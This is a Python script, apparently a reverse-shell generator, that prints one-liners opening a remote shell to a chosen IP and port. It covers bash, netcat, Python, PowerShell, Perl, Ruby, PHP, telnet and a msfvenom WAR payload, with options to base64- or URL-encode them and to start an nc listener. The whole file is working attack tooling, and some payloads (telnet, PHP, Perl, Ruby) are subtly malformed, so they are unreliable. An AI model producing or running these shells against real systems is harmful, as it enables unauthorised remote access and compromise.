#!/usr/bin/env python3

import urllib.parse
import subprocess
import argparse
import base64
import sys

def print_banner():
    print(r"""
                        __         ____               
   ________ _   _______/ /_  ___  / / /___ ____  ____ 
  / ___/ _ \ | / / ___/ __ \/ _ \/ / / __ `/ _ \/ __ \
 / /  /  __/ |/ (__  ) / / /  __/ / / /_/ /  __/ / / /
/_/   \___/|___/____/_/ /_/\___/_/_/\__, /\___/_/ /_/ 
                                   /____/             
""")
    
def urlencode(rev_shell):
    encoded_shell = urllib.parse.quote(rev_shell)
    encoded_shell = encoded_shell.strip()
    return encoded_shell

def base64_encode(rev_shell):
    encoded_bytes = base64.b64encode(rev_shell.encode('utf-8'))
    encoded_shell = encoded_bytes.decode('utf-8')
    return encoded_shell

def start_listener(port):
    listener = ["nc", "-lvnp", str(port)]
    try:
        subprocess.call(listener)
    except KeyboardInterrupt:
        sys.exit(1)

def reverse_shell(shell_type, ip, port):
    reverse_shells = {
        "bash": f"bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'",
        "zsh": f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
        "nc-mkfifo": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "nc": f"nc -e /bin/sh {ip} {port}",
        "php": f"""php -r '$sock=fsockopen(getenv("{ip}"),getenv("{port}"));exec("/bin/sh -i <&3 >&3 2>&3");'""",
        "telnet": f"TF=$(mktemp -u); mkfifo $TF && telnet {ip} {port} 0<$TF | /bin sh 1>$TF",
        "python": f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""",
        "war":f"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
        "powershell": """powershell -nop -c '$client = New-Object System.Net.Sockets.TCPClient('%s',%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'""" % (ip, port),
        "perl": "perl -e 'use Socket;$i='$ENV{%s}';$p=$ENV{%s};socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};'" % (ip, port),
        "ruby": """ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["%s"],ENV["%s"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'""" % (ip, port)
    }
    return reverse_shells[shell_type]

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="A reverse shell generator")   
    parser.add_argument("-s", "--shells", action="store_true", help="list available reverse shells")
    parser.add_argument("-b", "--base64", action="store_true", help="base64 encode the reverse shell")
    parser.add_argument("-u", "--urlencode", action="store_true", help="urlencode the reverse shell")
    parser.add_argument("-l", "--listener", action="store_true", help="start a listener")
    required_args = parser.add_argument_group('required arguments')
    required_args.add_argument("-t", "--type", metavar="<SHELL_TYPE>", help="select a reverse shell type")
    required_args.add_argument("-i", "--ip", metavar="<YOUR_IP_ADDRESS>", help="the ip address of your host")
    required_args.add_argument("-p", "--port", metavar="<PORT_NUMBER>", help="the portnumber for the shell")

    args = parser.parse_args()

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(1)

    if args.shells:
        print("Shell types: bash / zsh / nc-mkfifo / nc / php / telnet / python / war / powershell / perl / ruby")
        sys.exit()

    if args.base64:
        try:
            shell = base64_encode(reverse_shell(args.type, args.ip, args.port))
            print(shell, "\n")
            if args.listener:
                start_listener(args.port)
        except KeyError:
            print("you need to set a shell type.")
            sys.exit(1)
    elif args.urlencode:
        try:
            shell = urlencode(reverse_shell(args.type, args.ip, args.port))
            print(shell, "\n")
            if args.listener:
                start_listener(args.port)
        except KeyError:
            print("you need to set a shell type.")
            sys.exit(1)
    else:
        try:
            print(reverse_shell(args.type, args.ip, args.port), "\n")
            if args.listener:
                start_listener(args.port)
        except KeyError:
            print("you need to set a shell type.")
            sys.exit(1)

if __name__ == '__main__':
    main()